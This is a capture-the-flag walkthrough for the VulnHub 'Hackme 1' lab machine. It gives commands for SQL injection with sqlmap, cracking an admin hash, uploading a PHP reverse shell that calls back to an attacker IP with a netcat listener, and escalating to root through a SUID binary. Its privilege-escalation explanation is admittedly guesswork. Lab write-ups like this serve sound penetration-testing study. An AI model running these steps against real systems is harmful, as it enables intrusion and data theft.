# Hackme 1: OSCP Walkthrough Notes

> **Source:** [Hackme 1 on VulnHub](https://www.vulnhub.com/entry/hackme-1,330/)
> **Author:** x4bx54
> **Difficulty:** Easy / Beginner
> **OS:** Linux (VirtualBox OVA)
> **Goal:** Gain root access / find `root.txt`
> **Note:** The author recommends VirtualBox over VMware for this machine.

---

## Table of Contents

1. [Recon](#1-recon)
2. [Enumeration](#2-enumeration)
3. [Exploitation](#3-exploitation)
4. [Privilege Escalation](#4-privilege-escalation)
5. [Screenshots](#5-screenshots)
6. [Key Takeaways](#6-key-takeaways)

---

## M4d3 w1th ❤️ by Ankit Patidar

---

## 1. Recon

### Host Discovery

Start by discovering the target on the network using netdiscover or arp-scan:

```bash
netdiscover -i tun0
arp-scan --localnet
```

The target IP is typically found in the `192.168.x.0/24` range (commonly `192.168.1.108` in walkthroughs, but vary your network).

### Port Scanning

Run a full Nmap scan with service detection and default scripts:

```bash
nmap -sV -sC -p- -T4 <target_ip>
```

### Expected Open Ports

| Port | Service | Details |
|------|---------|---------|
| 22   | SSH     | OpenSSH server |
| 80   | HTTP    | Apache/Nginx web server |

Only two open ports: clean and focused for a beginner-level box that emphasizes web exploitation.

### Web Server Fingerprinting

```bash
curl -I http://<target_ip>/
whatweb http://<target_ip>/
nikto -h http://<target_ip>/
```

Note any server header, CMS identification, or version disclosures.

---

## 2. Enumeration

### Web Application Enumeration

Navigate to `http://<target_ip>/` in a browser and inspect the application manually.

A **login page** is presented along with a **sign-up option**.

#### User Registration
1. Register a new user account with a chosen username and password (e.g., `test` / `test123`).
2. Log in to explore post-authentication pages.
3. Observe all functionality: dashboard, settings, admin panel mentions, etc.

#### Directory & File Brute-Force

```bash
dirb http://<target_ip>/
gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak
gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirsearch/db/dict.txt
```

Discover hidden pages such as:
- `/welcomeadmin.php`: admin panel
- `/uploads/`: file upload directory
- `/login.php`: login endpoint
- `/register.php`: registration endpoint
- Configuration or backup files

#### Burp Suite Interception

Configure Burp Suite as a proxy and capture traffic:

1. Set browser proxy to Burp (typically `127.0.0.1:8080`).
2. Log in to the application.
3. Save the login request to a file (e.g., `sql.txt`):
   - In Burp: right-click the request → "Save Item"
4. This intercepted request will be fed to SQLMap.

### CMS / Application Fingerprinting

- Identify the technology stack (PHP + MySQL is typical).
- Check for any CMS indicators or custom application frameworks.

---

## 3. Exploitation

### SQL Injection: Automated Discovery

#### Step 1: Test with SQLMap

Use the intercepted request from Burp Suite:

```bash
sqlmap -r sql.txt --dbs --batch
```

This extracts all available databases from the target.

#### Step 2: Dump Database Contents

Identify the relevant database (e.g., `webapphacking`):

```bash
sqlmap -r sql.txt -D webapphacking --dump-all --batch
```

The dump reveals:
- **Multiple user accounts** with plaintext or hashed passwords.
- **A super admin account**: the password is stored only as a **hash value** (no plaintext equivalent in the database).

#### Step 3: Crack the Admin Hash

Save the admin hash to a file:

```bash
echo '<admin_hash>' > admin_hash.txt
```

Crack using:

```bash
# Hashcat (adjust mode based on hash type)
hashcat -m 0 -a 0 admin_hash.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt admin_hash.txt

# Online hash cracker (alternative)
# Submit to a cracking service if local tools fail
```

The cracked plaintext password for the super admin is **"Uncrackable"** (the name is ironic).

### Admin Access

1. Navigate to the admin panel:
   ```
   http://<target_ip>/welcomeadmin.php
   ```
2. Log in with the super admin credentials.
3. Explore the admin functionality: particularly a **file upload** feature.

### File Upload: PHP Reverse Shell

#### Step 1: Prepare the Shell

Copy a PHP reverse shell to the current directory and modify the IP and port:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
nano shell.php
# Update $ip = "<attacker_ip>";
# Update $port = 1234;
```

#### Step 2: Upload the Shell

Use the admin panel's file upload feature to upload `shell.php`.

#### Step 3: Locate the Uploaded Shell

The upload path is unknown, so brute-force to find it:

```bash
dirb http://<target_ip>/
# or
gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

The shell is typically found at:
```
http://<target_ip>/uploads/shell.php
```

#### Step 4: Trigger the Reverse Shell

1. Start a Netcat listener:
   ```bash
   nc -lvnp 1234
   ```
2. In a browser, visit:
   ```
   http://<target_ip>/uploads/shell.php
   ```
3. A connection should arrive on the listener.

#### Step 5: Upgrade to a TTY Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or
stty raw -echo; fg
```

Verify the shell:
```bash
whoami
id
```

A **low-privilege user shell** is obtained at this stage.

---

## 4. Privilege Escalation

### SUID Binary Enumeration

```bash
find / -perm -u=s -type f 2>/dev/null
```

### Key Discovery

The SUID scan reveals a directory `/home/legacy` containing a binary called **`touchmenot`** with the SUID bit set.

### Exploiting the SUID Binary

```bash
cd /home/legacy
ls -la
./touchmenot
id
```

Executing `touchmenot` spawns a **root shell**, confirmed by `id`:
- `uid=0(root) gid=0(root)`: you are now root.

> Note: The exact exploit mechanism may involve:
>: The binary being a wrapper that can be tricked into executing arbitrary commands
>: A PATH hijacking vector within the binary
>: The binary calling `system()` or `popen()` with unsanitized input
>: The binary checking for a file and then performing an action on it (e.g., `/tmp/touchmenot_lock`)

### Read the Root Flag

```bash
cat /root/root.txt
```

### Confirm Root Access

```bash
whoami       # should output "root"
cat /root/root.txt
id           # uid=0(root) gid=0(root) groups=0(root)
```

---

## 5. Screenshots

*No screenshots available for this machine.*

---

## 6. Key Takeaways

1. **Web application SQL injection is a reliable initial access vector.** SQLMap automates discovery and data extraction: use intercepted requests from Burp Suite for reliable injection.

2. **Hash cracking is a critical skill.** The admin password stored as a hash must be cracked offline: tools like Hashcat, John the Ripper, and online services are all valid approaches.

3. **File upload functionality is dangerous.** Web applications that allow file uploads to arbitrary users (including admin panels) can be exploited by uploading a reverse shell disguised as a legitimate file.

4. **Directory brute-forcing is essential.** Uploaded files are often placed in predictable directories like `/uploads/`: tools like `dirb`, `gobuster`, or `dirsearch` are necessary to locate them.

5. **SUID binaries on home directories are suspicious.** A SUID binary in `/home/legacy/` is unusual and often a deliberate privEsc path placed by the machine creator.

6. **Start web recon early and be methodical.** The flow: registration → login → intercept → inject → dump → crack → upload → shell → escalate: covers a full attack chain from first contact to root.

7. **Low privilege is not the goal.** Every shell is a stepping stone: always enumerate for escalation vectors immediately after gaining initial access.

---

## M4d3 w1th ❤️ by Ankit Patidar
